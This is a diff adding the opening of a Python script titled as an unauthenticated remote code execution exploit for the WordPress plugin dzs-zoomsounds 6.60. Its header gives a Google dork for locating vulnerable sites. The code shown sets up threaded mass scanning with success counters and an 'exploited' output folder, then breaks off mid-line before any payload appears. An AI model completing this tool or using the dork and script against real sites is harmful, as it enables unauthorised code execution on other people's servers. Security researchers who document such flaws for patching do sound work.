@@ -1,0 +1,41 @@
+# Exploit Title: WordPress Plugin dzs-zoomsounds - Remote Code Execution (RCE) (Unauthenticated)
+# Google Dork: inurl:wp-content/plugins/dzs-zoomsounds
+# Date: 16/02/2022
+# Exploit Author: Overthinker1877 (1877 Team)
+# Vendor Homepage: https://digitalzoomstudio.net/docs/wpzoomsounds/
+# Version: 6.60
+# Tested on: Windows / Linux
+
+import os
+import requests
+import threading
+from multiprocessing.dummy import Pool,Lock
+from bs4 import BeautifulSoup
+import time
+import smtplib,sys,ctypes
+from random import choice
+from colorama import Fore
+from colorama import Style
+from colorama import init
+import re
+import time
+from time import sleep
+init(autoreset=True)
+fr = Fore.RED
+gr = Fore.BLUE
+fc = Fore.CYAN
+fw = Fore.WHITE
+fy = Fore.YELLOW
+fg = Fore.GREEN
+sd = Style.DIM
+sn = Style.NORMAL
+sb = Style.BRIGHT
+Bad = 0
+Good = 0
+def Folder(directory):
+  if not os.path.exists(directory):
+    os.makedirs(directory)
+Folder('exploited')
+def clear():
+    try:
+        if os.
